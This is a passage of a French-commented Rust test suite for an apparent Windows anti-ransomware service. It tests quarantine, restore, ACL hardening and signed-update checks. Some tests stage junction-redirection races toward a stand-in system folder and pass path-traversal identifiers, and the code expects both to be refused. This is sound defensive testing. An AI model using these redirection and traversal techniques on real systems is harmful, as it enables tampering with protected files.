    let cibles = vec![std::path::PathBuf::from(r"c:\users\marie\onedrive\documents\0 devis 1234.docx")];
    let gardes = precedents_hors_cibles(&precedents, &cibles);
    assert_eq!(gardes.len(), 1);
    assert_eq!(gardes[0].chemin, r"C:\Users\marie\Documents\0 Devis 1234.docx");
    let h = include_str!("hygiene.rs").replace("\r\n", "\n");
    let r = &h[h.find("pub fn retirer_leurres(").unwrap()..];
    let r = &r[..r.find("\n}").unwrap()];
    assert!(r.contains("retirer_leurre_du_profil(&l.sid"), "désinstallation : identité mémorisée avec le leurre");
    let m = include_str!("moniteur.rs");
    assert!(m.contains("hygiene::retirer_leurres(&leurres)"), "désinstallation : leurres des dossiers redirigés compris");
}

/// Audit du 2026-11-23, A-8-1 : plus de priorité basse pour tout le processus ; fils lourds et périodiques en arrière-plan,
/// fil des 4663 des leurres et fil du canal de commandes au-dessus de la normale, par une seule fonction
#[test]
fn a8_1_priorites_des_fils() {
    let main = include_str!("main.rs");
    assert!(!main.contains("priorite_basse") && !main.contains("BELOW_NORMAL") && !main.contains("SetPriorityClass"), "processus en priorité normale");
    for (f, src) in [("moniteur.rs", include_str!("moniteur.rs")), ("canal.rs", include_str!("canal.rs")), ("vol_donnees.rs", include_str!("vol_donnees.rs")),
                     ("hygiene.rs", include_str!("hygiene.rs")), ("evenements.rs", include_str!("evenements.rs"))] {
        assert!(!src.contains("SetThreadPriority") && !src.contains("SetPriorityClass") && !src.contains("BELOW_NORMAL"), "{f} : priorité réglée hors de natif::fil_priorite");
    }
    // Fil nommé : l'appel suit sa création, avant toute autre ligne de travail
    let fil = |src: &str, nom: &str, attendu: &str| {
        let src = src.replace("\r\n", "\n");
        let i = src.find(&format!(".name(\"{nom}\".into()).spawn(")).unwrap_or_else(|| panic!("fil {nom} introuvable"));
        let corps = src[i..].lines().take(3).collect::<Vec<_>>().join("\n");
        assert!(corps.contains(attendu), "fil {nom} : {attendu} attendu en tête\n{corps}");
    };
    let m = include_str!("moniteur.rs");
    for nom in ["persistance", "contrôles", "listes de menaces"] {
        fil(m, nom, "natif::fil_priorite(natif::Priorite::Arriere)");
    }
    fil(include_str!("vol_donnees.rs"), "audit données sensibles", "natif::fil_priorite(crate::natif::Priorite::Arriere)");
    fil(include_str!("canal.rs"), "commandes", "natif::fil_priorite(crate::natif::Priorite::Haute)");
    let v = include_str!("vol_donnees.rs");
    assert!(v.contains("evenements::abonner_avec_priorite(\"Security\", \"*[System[EventID=4663]]\", crate::collectes::Collecte::JournalSecurite, Some(crate::natif::Priorite::Haute),"),
            "fil des 4663 des leurres au-dessus de la normale");
    let e = include_str!("evenements.rs").replace("\r\n", "\n");
    let a = &e[e.find("pub fn abonner_avec_priorite(").unwrap()..];
    let a = &a[a.find(".spawn(move ||").unwrap()..];
    assert!(a[..300].contains("crate::natif::fil_priorite(p)"), "priorité posée au début du fil d'abonnement");
    // Surveillance (cycle de 3 s) : jamais en arrière-plan
    let s = m.replace("\r\n", "\n");
    let s = &s[s.find(".name(\"surveillance\".into())").unwrap()..];
    assert!(!s[..s.find("}).unwrap();").unwrap()].contains("fil_priorite"), "cycle de surveillance laissé en priorité normale");
}

fn contenu_dossier(d: &std::path::Path) -> Vec<String> {
    let mut v: Vec<String> = std::fs::read_dir(d).map(|l| l.flatten().map(|e| e.file_name().to_string_lossy().to_string()).collect()).unwrap_or_default();
    v.sort();
    v
}

#[test]
fn lot1ter_meme_chemin_et_chemin_final() {
    use crate::natif::{chemin_final, forme_longue, meme_chemin, ouvrir_verifie, ErreurOuverture};
    assert!(meme_chemin(r"\\?\C:\Users\Marie\x.txt", r"c:\users\marie\X.TXT"));
    assert!(meme_chemin(r"\\?\UNC\serveur\partage\x", r"\\serveur\partage\x\"));
    assert!(meme_chemin("C:/a/b", r"C:\a\b"));
    assert!(!meme_chemin(r"C:\a\b", r"C:\a\bc"));
    assert!(!meme_chemin("", ""));
    assert!(!meme_chemin(r"\\?\C:\Windows\System32\x", r"C:\Users\x"));
    let d = dossier_test("chemin-final");
    let f = d.join("a.txt");
    std::fs::write(&f, b"a").unwrap();
    let h = ouvrir_verifie(&f, 0x8000_0000 | 0x0010_0000, 0x7, false).unwrap();
    // Le dossier temporaire peut lui-même être désigné en noms courts (CI) : comparaison avec la forme longue
    assert!(meme_chemin(&chemin_final(&h).unwrap(), &forme_longue(&f).to_string_lossy()));
    assert_eq!(ouvrir_verifie(&d.join("absent.txt"), 0x8000_0000, 0x7, false).unwrap_err(), ErreurOuverture::Absent);
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1ter_jonction_avant_restauration() {
    use crate::reponse::{creer_sans_lien, quarantaine_transaction};
    let d = dossier_test("jonction-restauration");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    let origine = d.join("Documents");
    let systeme = d.join("systeme"); // tient lieu de dossier système
    std::fs::create_dir_all(&origine).unwrap();
    std::fs::create_dir_all(&systeme).unwrap();
    let f = origine.join("pilote.dll");
    std::fs::write(&f, b"contenu").unwrap();
    let m = Manifeste::new(&d, 0);
    let mut liste = Vec::new();
    quarantaine_transaction(&dq, &mut liste, &f, "j1", "test", &sddl, &|l| m.ecrire(l)).unwrap();
    // Avant la restauration, Documents est remplacé par une jonction vers le dossier « système »
    std::fs::remove_dir(&origine).unwrap();
    jonction(&origine, &systeme);
    let r = restaurer_test(&dq, &mut liste, "j1", &|l| m.ecrire(l));
    assert!(r.unwrap_err().contains("lien"), "restauration refusée");
    assert!(contenu_dossier(&systeme).is_empty(), "rien d'écrit hors du dossier d'origine");
    assert_eq!(liste.len(), 1, "copie et entrée intactes");
    // Même sans le contrôle préalable (jonction posée juste après lui) : création détournée détectée par le
    // chemin final, fichier créé supprimé par son handle
    assert!(crate::natif::creer_verifie(&f).is_err());
    assert!(contenu_dossier(&systeme).is_empty(), "fichier détourné retiré");
    assert!(creer_sans_lien(&f).is_err());
    std::fs::remove_dir(&origine).unwrap(); // retire la jonction, pas sa cible
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1ter_jonction_pendant_la_quarantaine() {
    use crate::reponse::quarantaine_transaction;
    let d = dossier_test("jonction-quarantaine");
    let (_, sddl) = sddl_test(&d);
    let dq = d.join("quarantaine");
    let telechargements = d.join("Telechargements");
    let systeme = d.join("systeme");
    std::fs::create_dir_all(&systeme).unwrap();
    std::fs::write(systeme.join("setup.exe"), b"fichier systeme").unwrap();
    // Entre le contrôle (chemin demandé dans Téléchargements) et l'opération, le dossier devient une jonction
    jonction(&telechargements, &systeme);
    let m = Manifeste::new(&d, 0);
    let mut liste = Vec::new();
    let r = quarantaine_transaction(&dq, &mut liste, &telechargements.join("setup.exe"), "q1", "test", &sddl, &|l| m.ecrire(l));
    assert!(r.unwrap_err().contains("ailleurs"), "chemin final différent : refus");
    assert_eq!(std::fs::read(systeme.join("setup.exe")).unwrap(), b"fichier systeme", "rien de supprimé");
    assert!(contenu_dossier(&dq).is_empty() && liste.is_empty(), "rien de lu ni de copié");
    // Le dernier élément lui-même est une jonction : refus aussi
    let r = quarantaine_transaction(&dq, &mut liste, &telechargements, "q2", "test", &sddl, &|l| m.ecrire(l));
    assert!(r.is_err());
    std::fs::remove_dir(&telechargements).unwrap();
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1ter_lien_dans_le_chemin_au_demarrage() {
    use crate::reponse::{etat_original, Original};
    let d = dossier_test("jonction-reprise");
    let systeme = d.join("systeme");
    std::fs::create_dir_all(&systeme).unwrap();
    std::fs::write(systeme.join("x.txt"), b"meme contenu").unwrap();
    let sha = crate::hygiene::empreinte_fichier(&systeme.join("x.txt")).unwrap();
    assert_eq!(etat_original(&systeme.join("x.txt"), &sha), Original::Identique);
    // Même contenu, mais atteint par une jonction : « différent », la copie sera gardée
    let lien = d.join("lien");
    jonction(&lien, &systeme);
    assert_eq!(etat_original(&lien.join("x.txt"), &sha), Original::Different);
    assert_eq!(etat_original(&lien, &sha), Original::Different, "le chemin est lui-même un lien");
    assert_eq!(etat_original(&d.join("absent.txt"), &sha), Original::Absent);
    std::fs::remove_dir(&lien).unwrap();
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1ter_restauration_sans_session_jamais_en_system() {
    use crate::reponse::{cible_restauration, CibleRestauration};
    let utilisateur = "S-1-5-21-1-2-3-1001";
    assert_eq!(cible_restauration(Some(utilisateur), true), CibleRestauration::Origine);
    assert!(matches!(cible_restauration(Some(utilisateur), false), CibleRestauration::Repli(_)), "pas de session : repli");
    for systeme in ["S-1-5-18", "S-1-5-32-544", "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464"] {
        assert!(matches!(cible_restauration(Some(systeme), true), CibleRestauration::Repli(_)), "{systeme}");
    }
    assert!(matches!(cible_restauration(None, true), CibleRestauration::Repli(_)));
    // Emprunt du jeton d'un compte sans session : erreur, et l'opération n'est pas exécutée
    let mut execute = false;
    assert!(crate::natif::avec_jeton_de(utilisateur, || execute = true).is_err());
    assert!(!execute);
}


/// Forme courte (8.3) d'un chemin existant, si le volume en crée
fn forme_courte(p: &std::path::Path) -> Option<std::path::PathBuf> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::GetShortPathNameW;
    let n: Vec<u16> = p.to_string_lossy().encode_utf16().chain(Some(0)).collect();
    let mut t = vec![0u16; 1024];
    let l = unsafe { GetShortPathNameW(PCWSTR(n.as_ptr()), Some(&mut t)) } as usize;
    (l > 0 && l < t.len()).then(|| std::path::PathBuf::from(String::from_utf16_lossy(&t[..l])))
}

#[test]
fn lot1ter_chemin_en_noms_courts_accepte() {
    // CI : le dossier temporaire est atteint par un nom court (C:\Users\RUNNER~1\…) alors que Windows rend le
    // chemin final en noms longs ; un chemin légitime ne doit pas être pris pour un détournement
    use crate::natif::{creer_verifie, forme_longue, meme_chemin, ouvrir_verifie};
    use crate::reponse::{etat_original, Original};
    let d = dossier_test("noms-courts");
    let long = d.join("un dossier au nom vraiment long");
    std::fs::create_dir_all(&long).unwrap();
    let f = long.join("fichier au nom tres long.txt");
    std::fs::write(&f, b"contenu").unwrap();
    let sha = crate::hygiene::empreinte_fichier(&f).unwrap();
    // Le dossier temporaire peut lui-même être désigné en noms courts (CI) : références en forme longue
    let f_long = forme_longue(&f);
    assert!(!f_long.to_string_lossy().contains('~'), "{}", f_long.display());
    match forme_courte(&f).filter(|c| !meme_chemin(&c.to_string_lossy(), &f_long.to_string_lossy())) {
        Some(court) => {
            assert!(meme_chemin(&forme_longue(&court).to_string_lossy(), &f_long.to_string_lossy()), "{}", court.display());
            assert!(ouvrir_verifie(&court, 0x8000_0000 | 0x0010_0000, 0x7, false).is_ok(), "{}", court.display());
            assert_eq!(etat_original(&court, &sha), Original::Identique);
            // Fichier à créer dans un dossier désigné par son nom court
            let dossier_court = forme_courte(&long).unwrap();
            let nouveau = dossier_court.join("nouveau.txt");
            assert!(creer_verifie(&nouveau).is_ok(), "{}", nouveau.display());
            assert!(long.join("nouveau.txt").exists());
        }
        None => eprintln!("noms courts 8.3 désactivés sur ce volume : cas de la CI non reproductible ici"),
    }
    let _ = std::fs::remove_dir_all(&d);
}

// ------------------------------------------------------------ lot 1 ter, revue de la PR 5

#[test]
fn lot1ter_reinitialisation_garde_les_droits_poses_a_la_creation() {
    use crate::natif::{copier_protege, creer_dossier_protege, lire_securite};
    use crate::protection::{icacls, proprietaire_acceptable, reinitialiser_contenu};
    let d = dossier_test("reinitialisation");
    let (moi, _) = sddl_test(&d);
    // Racine : droit de lecture hérité pour Utilisateurs (tient lieu des comptes autorisés)
    assert!(icacls(&[&d.to_string_lossy(), "/grant", "*S-1-5-32-545:(OI)(CI)RX"]));
    let q = d.join("quarantaine");
    std::fs::create_dir_all(&q).unwrap();
    let source = d.join("source.bin");
    std::fs::write(&source, b"contenu").unwrap();
    let copie = q.join("x.quarantaine");
    copier_protege(&source, &copie, &format!("O:{moi}D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;{moi})")).unwrap();
    std::fs::create_dir_all(d.join("restaurations")).unwrap();
    let repli = d.join("restaurations").join("id1");
    assert!(creer_dossier_protege(&repli, &format!("O:{moi}D:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;{moi})(A;OICI;0x1200a9;;;S-1-5-32-546)")));
    let ordinaire = d.join("ordinaire.json");
    std::fs::write(&ordinaire, b"{}").unwrap();
    assert!(icacls(&[&ordinaire.to_string_lossy(), "/grant", "*S-1-5-11:F"]));
    // DACL protégée et propriétaire de confiance, mais Utilisateurs authentifiés peut y écrire : pas gardé
    let ecrivable = d.join("protege-mais-ecrivable.json");
    copier_protege(&source, &ecrivable, &format!("O:{moi}D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;{moi})(A;;0x1301bf;;;S-1-5-11)")).unwrap();
    // En service, la règle est « propriétaire SYSTEM ou Administrateurs » ; ici le compte du test en tient lieu
    reinitialiser_contenu(&d, &|o: &str| o == moi || proprietaire_acceptable(o));
    let s = lire_securite(&copie).unwrap();
    assert!(s.protege, "copie de quarantaine : héritage toujours coupé");
    assert!(!s.aces.iter().any(|a| a.sid == "S-1-5-32-545"), "aucun droit hérité ajouté : {:?}", s.aces);
    let s = lire_securite(&repli).unwrap();
    assert!(s.protege && s.aces.iter().any(|a| a.sid == "S-1-5-32-546"), "dossier de repli : lecteur conservé {:?}", s.aces);
    let s = lire_securite(&ordinaire).unwrap();
    assert!(!s.aces.iter().any(|a| a.sid == "S-1-5-11"), "élément ordinaire : entrée explicite retirée {:?}", s.aces);
    assert!(s.aces.iter().any(|a| a.sid == "S-1-5-32-545"), "élément ordinaire : droits hérités du dossier");
    let s = lire_securite(&ecrivable).unwrap();
    assert!(!s.aces.iter().any(|a| a.sid == "S-1-5-11"), "écriture d'un autre compte : réinitialisé {:?}", s.aces);
    assert!(!s.protege && s.aces.iter().any(|a| a.sid == "S-1-5-32-545"));
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1ter_dossier_de_repli_verifie() {
    use crate::natif::lire_securite;
    use crate::protection::{droits_conformes_pour, SID_ADMINISTRATEURS as BA, SID_SYSTEME as SY};
    use crate::reponse::preparer_dossier_repli;
    let d = dossier_test("repli");
    let (moi, _) = sddl_test(&d);
    let lecteur = "S-1-5-32-546";
    let sddl = format!("O:{moi}D:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;{moi})(A;OICI;0x1200a9;;;{lecteur})");
    let conforme = |s: &crate::natif::Securite| droits_conformes_pour(s, &|o: &str| o == moi, &[SY, BA, moi.as_str()], &[lecteur]);
    let base = d.join("restaurations");
    // Création normale
    let r = preparer_dossier_repli(&base, "a1", &sddl, false, &conforme).unwrap();
    assert!(conforme(&lire_securite(&r).unwrap()).is_ok());
    // Sous-dossier préexistant aux droits incorrects (hérités, sans le lecteur) : droits réimposés puis relus
    std::fs::create_dir_all(base.join("a2")).unwrap();
    assert!(conforme(&lire_securite(&base.join("a2")).unwrap()).is_err());
    let r = preparer_dossier_repli(&base, "a2", &sddl, false, &conforme).unwrap();
    let s = lire_securite(&r).unwrap();
    assert!(s.protege && s.aces.iter().any(|a| a.sid == lecteur), "{:?}", s.aces);
    // Sous-dossier remplacé par une jonction (vers un dossier « système ») : refus
    let systeme = d.join("systeme");
    std::fs::create_dir_all(&systeme).unwrap();
    jonction(&base.join("a3"), &systeme);
    assert!(preparer_dossier_repli(&base, "a3", &sddl, false, &conforme).unwrap_err().contains("lien"));
    std::fs::remove_dir(base.join("a3")).unwrap();
    // Dossier restaurations lui-même remplacé par une jonction : refus
    let base2 = d.join("restaurations2");
    jonction(&base2, &systeme);
    assert!(preparer_dossier_repli(&base2, "a4", &sddl, false, &conforme).is_err());
    assert!(contenu_dossier(&systeme).is_empty(), "rien de créé dans la cible de la jonction");
    std::fs::remove_dir(&base2).unwrap();
    // Protection du dossier de données en échec : refus
    assert!(preparer_dossier_repli(&base, "a5", &sddl, true, &conforme).unwrap_err().contains("échec"));
    assert!(!base.join("a5").exists());
    // Dossier restaurations impossible à créer (parent absent) : erreur, pas ignorée
    assert!(preparer_dossier_repli(&d.join("absent").join("restaurations"), "a6", &sddl, false, &conforme).is_err());
    // Identifiant qui sortirait du dossier : refus
    assert!(preparer_dossier_repli(&base, r"..\x", &sddl, false, &conforme).is_err());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot1ter_garder_tel_quel_sans_ecriture_etrangere() {
    use crate::protection::{a_garder_tel_quel, proprietaire_acceptable, SID_ADMINISTRATEURS as BA, SID_SYSTEME as SY};
    let ok = |s: &crate::natif::Securite| a_garder_tel_quel(s, &proprietaire_acceptable);
    let lecteur = "S-1-5-21-1-2-3-1001";
    // Copie de quarantaine, secrets, jeton : SYSTEM et Administrateurs seulement
    assert!(ok(&securite(SY, true, &[(true, 0x1f01ff, SY), (true, 0x1f01ff, BA)])));
    // Dossier de repli : lecteur en lecture seule
    assert!(ok(&securite(SY, true, &[(true, 0x1f01ff, SY), (true, 0x1f01ff, BA), (true, 0x1200a9, lecteur)])));
    // Un autre compte avec un droit d'écriture, quel qu'il soit : réinitialisé
    for ecriture in [0x2u32, 0x4, 0x10, 0x40, 0x100, 0x1_0000, 0x4_0000, 0x8_0000, 0x0200_0000, 0x1000_0000, 0x4000_0000] {
        assert!(!ok(&securite(SY, true, &[(true, 0x1f01ff, SY), (true, 0x1200a9 | ecriture, lecteur)])), "droit {ecriture:#x}");
    }
    assert!(!ok(&securite(SY, true, &[(true, 0x1f01ff, "S-1-1-0")])), "Tout le monde en contrôle total");
    // Un refus explicite ne compte pas comme un droit
    assert!(ok(&securite(SY, true, &[(false, 0x1f01ff, "S-1-1-0"), (true, 0x1f01ff, SY)])));
    // Héritage actif, propriétaire étranger, entrée inconnue : réinitialisé
    assert!(!ok(&securite(SY, false, &[(true, 0x1f01ff, SY)])));
    assert!(!ok(&securite(lecteur, true, &[(true, 0x1f01ff, SY)])));
    let mut inconnue = securite(SY, true, &[(true, 0x1f01ff, SY)]);
    inconnue.ace_inconnue = true;
    assert!(!ok(&inconnue));
}

// ------------------------------------------------------------ lot 2 : mise à jour, version lue dans le paquet signé

fn manifeste_json(version: &str, fichiers: &[(&str, &str, &str)]) -> Vec<u8> {
    let f: Vec<String> = fichiers.iter().map(|(n, u, h)| format!(r#"{{"Nom":"{n}","Url":"{u}","Sha256":"{h}"}}"#)).collect();
    format!(r#"{{"Version":"{version}","Fichiers":[{}]}}"#, f.join(",")).into_bytes()
}

#[test]
fn lot2_manifeste_strict() {
    use crate::maj::lire_manifeste;
    let h = "ab".repeat(32);
    let url = "https://github.com/cryptobones-1337/deR4Tizer/releases/download/v4.4/deR4Tizer.msi";
    let m = lire_manifeste(&manifeste_json("4.4", &[("deR4Tizer.msi", url, &h)])).unwrap();
    assert_eq!(m.version, "4.4");
    let mut bom = "\u{feff}".as_bytes().to_vec();
    bom.extend(manifeste_json("4.4", &[("deR4Tizer.msi", url, &h)]));
    assert!(lire_manifeste(&bom).is_ok(), "BOM UTF-8 accepté");
    let refus = |octets: Vec<u8>, attendu: &str| {
        let e = lire_manifeste(&octets).unwrap_err();
        assert!(e.contains(attendu), "{e}");
    };
    // Fichier manquant, en double, inattendu
    refus(manifeste_json("4.4", &[]), "absent");
    refus(manifeste_json("4.4", &[("deR4Tizer.msi", url, &h), ("deR4Tizer.msi", url, &h)]), "double");
    refus(manifeste_json("4.4", &[("deR4Tizer.msi", url, &h), ("deR4TizerSvc.exe", url, &h)]), "inattendu");
    refus(manifeste_json("4.4", &[("autre.msi", url, &h)]), "inattendu");
    // Champs inconnus ou manquants, version, empreinte, adresse
    refus(br#"{"Version":"4.4","Fichiers":[],"Clef":"x"}"#.to_vec(), "invalide");
    refus(format!(r#"{{"Version":"4.4","Fichiers":[{{"Nom":"deR4Tizer.msi","Url":"{url}","Sha256":"{h}","Taille":1}}]}}"#).into_bytes(), "invalide");
    refus(format!(r#"{{"Version":"4.4","Fichiers":[{{"Nom":"deR4Tizer.msi","Url":"{url}"}}]}}"#).into_bytes(), "invalide");
    refus(manifeste_json("99.0-beta", &[("deR4Tizer.msi", url, &h)]), "version");
    refus(manifeste_json("4..4", &[("deR4Tizer.msi", url, &h)]), "version");
    refus(manifeste_json("4.4", &[("deR4Tizer.msi", url, "abc")]), "empreinte");
    refus(manifeste_json("4.4", &[("deR4Tizer.msi", "http://exemple.invalid/x.msi", &h)]), "adresse");
    refus(manifeste_json("4.4", &[("deR4Tizer.msi", "https://exemple.invalid/a b.msi", &h)]), "adresse");
    // Taille bornée
    let mut gros = manifeste_json("4.4", &[("deR4Tizer.msi", url, &h)]);
    gros.extend(std::iter::repeat_n(b' ', 70_000));
    refus(gros, "trop gros");
    refus(vec![0xff, 0xfe, 0x00], "UTF-8");
    // Mini-fuzz : jamais de panique
    torturer(&manifeste_json("4.4", &[("deR4Tizer.msi", url, &h)]), &mut |d| {
        let _ = lire_manifeste(d);
    });
}

#[test]
fn lot2_decision_installation() {
    use crate::maj::{cles_epinglees, decision_installation, lire_manifeste, meme_version, Artefact, UPGRADE_CODE};
    let h = "ab".repeat(32);
    let cle = "c1".repeat(32);
    let cles = cles_epinglees(Some(&cle));
    let url = "https://github.com/cryptobones-1337/deR4Tizer/releases/download/v4.4/deR4Tizer.msi";
    let m = lire_manifeste(&manifeste_json("4.4", &[("deR4Tizer.msi", url, &h)])).unwrap();
    let bon = Artefact { sha256: h.clone(), cle: Some(cle.clone()), proprietes: Some(("4.4.0".into(), UPGRADE_CODE.into())) };
    assert!(decision_installation(&m, &bon, "4.3", &cles).is_ok());
    assert!(meme_version("4.4", "4.4.0") && !meme_version("4.4", "4.4.1") && !meme_version("4.4", "x"));
    let refus = |a: &Artefact, installee: &str, cles: &[String], attendu: &str| {
        let e = decision_installation(&m, a, installee, cles).unwrap_err();
        assert!(e.contains(attendu), "{e}");
    };
    // Version de l'artefact ≠ manifeste (manifeste « 4.4 » pour un ancien paquet signé)
    refus(&Artefact { proprietes: Some(("4.1.0".into(), UPGRADE_CODE.into())), ..bon.clone() }, "4.3", &cles, "différente");
    // Version égale ou plus ancienne que la version installée
    refus(&bon, "4.4", &cles, "pas plus récente");
    refus(&bon, "4.10", &cles, "pas plus récente");
    // Empreinte fausse
    refus(&Artefact { sha256: "cd".repeat(32), ..bon.clone() }, "4.3", &cles, "empreinte");
    // Signature absente (ou invalide, ou révoquée)
    refus(&Artefact { cle: None, ..bon.clone() }, "4.3", &cles, "signature");
    // Clé inattendue
    refus(&Artefact { cle: Some("ee".repeat(32)), ..bon.clone() }, "4.3", &cles, "autre clé");
    // Liste de clés vide ou mal formée
    refus(&bon, "4.3", &cles_epinglees(None), "épinglée");
    refus(&bon, "4.3", &cles_epinglees(Some("c1c1 ; trop-court ;")), "épinglée");
    // Paquet signé d'un autre produit, propriétés illisibles
    refus(&Artefact { proprietes: Some(("4.4.0".into(), "{00000000-0000-0000-0000-000000000000}".into())), ..bon.clone() }, "4.3", &cles, "autre produit");
    refus(&Artefact { proprietes: None, ..bon.clone() }, "4.3", &cles, "illisibles");
}

#[test]
fn lot2_adresse_du_paquet_de_retour() {
    use crate::maj::url_paquet_version;
    assert_eq!(url_paquet_version("https://github.com/cryptobones-1337/deR4Tizer/releases/latest/download/manifeste.json", "4.3").as_deref(),
        Some("https://github.com/cryptobones-1337/deR4Tizer/releases/download/v4.3/deR4Tizer.msi"));
    assert!(url_paquet_version("http://github.com/x/releases/latest/download/manifeste.json", "4.3").is_none());
    assert!(url_paquet_version("https://exemple.invalid/manifeste.json", "4.3").is_none());
    assert!(url_paquet_version("https://github.com/x/releases/latest/download/autre.json", "4.3").is_none());
    assert!(url_paquet_version("https://github.com/x/releases/latest/download/manifeste.json", "4.3/../x").is_none());
}

#[test]
fn lot2_proprietes_lues_dans_le_paquet() {
    use crate::natif::proprietes_msi;
    use windows::core::PCWSTR;
    use windows::Win32::System::ApplicationInstallationAndServicing::{
        MsiCloseHandle, MsiDatabaseCommit, MsiDatabaseOpenViewW, MsiOpenDatabaseW, MsiViewExecute, MSIDBOPEN_CREATE, MSIHANDLE,
    };
    let d = dossier_test("msi");
    let f = d.join("test.msi");
    let large = |s: &str| s.encode_utf16().chain(Some(0)).collect::<Vec<u16>>();
    unsafe {
        let mut base = MSIHANDLE::default();
        assert_eq!(MsiOpenDatabaseW(PCWSTR(large(&f.to_string_lossy()).as_ptr()), MSIDBOPEN_CREATE, &mut base), 0);
        for requete in ["CREATE TABLE `Property` (`Property` CHAR(72) NOT NULL, `Value` LONGCHAR NOT NULL PRIMARY KEY `Property`)",
                        "INSERT INTO `Property` (`Property`, `Value`) VALUES ('ProductVersion', '4.4.0')",
                        "INSERT INTO `Property` (`Property`, `Value`) VALUES ('UpgradeCode', '{6F1E2B47-9C3A-4D58-8E21-4B7D0C9A3F15}')"] {
            let mut vue = MSIHANDLE::default();
            assert_eq!(MsiDatabaseOpenViewW(base, PCWSTR(large(requete).as_ptr()), &mut vue), 0, "{requete}");
            assert_eq!(MsiViewExecute(vue, MSIHANDLE::default()), 0, "{requete}");
            MsiCloseHandle(vue);
        }
        assert_eq!(MsiDatabaseCommit(base), 0);
        MsiCloseHandle(base);
    }
    assert_eq!(proprietes_msi(&f).unwrap(), ("4.4.0".to_string(), crate::maj::UPGRADE_CODE.to_string()));
    let pas_msi = d.join("pas-un-msi.msi");
    std::fs::write(&pas_msi, b"MZ").unwrap();
    assert!(proprietes_msi(&pas_msi).is_err());
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
fn lot2_retour_arriere_simule() {
    use crate::maj::{script_installation, ParametresScript, Simulation};
    let d = dossier_test("retour-arriere");
    let paquet = d.join("4.4").join("deR4Tizer.msi");
    let retour = d.join("4.3").join("deR4Tizer.msi");
    std::fs::create_dir_all(paquet.parent().unwrap()).unwrap();
    std::fs::create_dir_all(retour.parent().unwrap()).unwrap();
    std::fs::write(&paquet, b"paquet 4.4").unwrap();
    std::fs::write(&retour, b"paquet 4.3").unwrap();
    let sha_paquet = crate::hygiene::empreinte_fichier(&paquet).unwrap();
    let sha_retour = crate::hygiene::empreinte_fichier(&retour).unwrap();
    let journal = d.join("actions.txt");
    let echec = d.join("echec.txt");
    let jouer_pid = |reponse: &str, sha_paquet: &str, pid_serveur: u32| -> (Vec<String>, Option<String>) {
        let _ = std::fs::remove_file(&journal);
        let _ = std::fs::remove_file(&echec);
        let s = script_installation(&ParametresScript {
            version: "4.4", paquet: &paquet, sha_paquet, retour: &retour, sha_retour: &sha_retour, journaux: &d,
            simulation: Some(Simulation { journal: &journal, reponse, pid_serveur, pid_service: 4242 }),
        });
        let sortie = std::process::Command::new("powershell.exe").args(["-NoProfile", "-NonInteractive", "-Command", &s]).env_remove("PSModulePath").output().unwrap();
        assert!(sortie.status.success(), "{}", String::from_utf8_lossy(&sortie.stderr));
        let actions: Vec<String> = std::fs::read_to_string(&journal).unwrap_or_default().lines().map(|l| l.trim().to_string()).collect();
        let e = std::fs::read_to_string(&echec).ok();
        // Diagnostic, affiché seulement si le test échoue
        eprintln!("réponse {reponse:?} : actions {actions:?}, journal présent {}, échec {e:?}, sortie {:?}, erreurs {:?}",
            journal.exists(), String::from_utf8_lossy(&sortie.stdout), String::from_utf8_lossy(&sortie.stderr));
        (actions, e)
    };
    let jouer = |reponse: &str, sha_paquet: &str| jouer_pid(reponse, sha_paquet, 4242);
    let installer = |p: &std::path::Path| format!("installer {}", p.display());
    // Le service répond, en JSON, avec la nouvelle version : pas de retour arrière
    let (a, e) = jouer(r#"{"Ok":true,"Message":"deR4Tizer 4.4"}"#, &sha_paquet);
    assert_eq!(a, vec![installer(&paquet), "canal".into()]);
    assert!(e.is_none());
    // Le service ne répond pas en JSON valide (ou pas du tout) : retour arrière par le paquet précédent
    for reponse in ["", "\"Ok\":true deR4Tizer 4.4", r#"{"Ok":false,"Message":"deR4Tizer 4.4"}"#, r#"{"Ok":true,"Message":"deR4Tizer 4.3"}"#] {
        let (a, e) = jouer(reponse, &sha_paquet);
        assert_eq!(a, vec![installer(&paquet), "canal".into(), "canal".into(), installer(&retour)], "réponse {reponse:?}");
        assert!(e.as_deref().is_some_and(|t| t.contains("réinstallé") && t.contains("4.4")), "{e:?}");
    }
    // Réponse valide, mais le tube est tenu par un autre processus que le service (squat pendant l'arrêt de
    // l'ancien service) : échec de santé, retour arrière
    let (a, e) = jouer_pid(r#"{"Ok":true,"Message":"deR4Tizer 4.4"}"#, &sha_paquet, 5151);
    assert_eq!(a, vec![installer(&paquet), "canal".into(), "canal".into(), installer(&retour)]);
    assert!(e.as_deref().is_some_and(|t| t.contains("réinstallé")), "{e:?}");
    // Paquet modifié après vérification : rien n'est installé
    let (a, e) = jouer(r#"{"Ok":true,"Message":"deR4Tizer 4.4"}"#, &"00".repeat(32));
    assert!(a.is_empty(), "{a:?}");
    assert!(e.as_deref().is_some_and(|t| t.contains("abandonnée")));
    let _ = std::fs::remove_dir_all(&d);
}

/// Lot 5 : un client du canal qui se connecte puis se tait ne bloque plus le canal : la lecture d'une commande est
/// bornée dans le temps ; une commande normale est toujours lue
#[test]
fn lot5_canal_lecture_bornee_client_silencieux() {
    use std::io::Write;
    use std::time::{Duration, Instant};
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::Storage::FileSystem::PIPE_ACCESS_DUPLEX;
    use windows::Win32::System::Pipes::{ConnectNamedPipe, CreateNamedPipeW, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT};
    for (essai, envoi) in [("silence", None), ("commande", Some("{\"Action\":\"verification\"}\n"))] {
        let nom = format!(r"\\.\pipe\d4t-essai-lot5-{essai}-{}", std::process::id());
